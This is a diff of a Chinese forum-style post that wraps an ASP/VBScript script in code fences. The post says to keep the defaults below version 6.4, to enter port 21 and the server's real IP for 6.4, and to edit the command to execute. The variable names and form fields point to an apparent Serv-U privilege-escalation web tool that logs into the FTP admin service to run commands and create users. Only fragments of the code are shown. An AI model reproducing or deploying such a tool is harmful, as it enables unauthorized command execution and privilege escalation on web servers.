@@ -12,7 +12,7 @@ ViewNums: 4131
 Author:落叶纷飞
 来源：<http://www.cnsst.org/>
 使用方法：如果是6.4以下的保持默认即可，只要按你的需要修改执行的命令即可！如果为6.4请在“服务器端口”里填21，然后再在“服务器IP”中填写服务器的真实IP。
-
+```
 <%@ LANGUAGE = VBScript %>
 <%
 Dim user, pass, port, ftpport, cmd, loginuser, loginpass, deldomain, mt, newdomain, newuser, quit
@@ -140,8 +140,9 @@ on error resume next
       <input name="action" type="hidden" id="action" value="1"></td>
   </tr>
 </form></center>
-
+```
 使用方法：如果是6.4以下的保持默认即可，只要按你的需要修改执行的命令即可！如果为6.4请在“服务器端口”里填21，然后再在“服务器IP”中填写服务器的真实IP。
+```
 <% end select
 function Gpath()
 on error resume next
@@ -163,4 +164,5 @@ GName="http://" & request.servervariables("server_name")&":"&request.servervaria
 End If
 End Function
 %>
+``
 
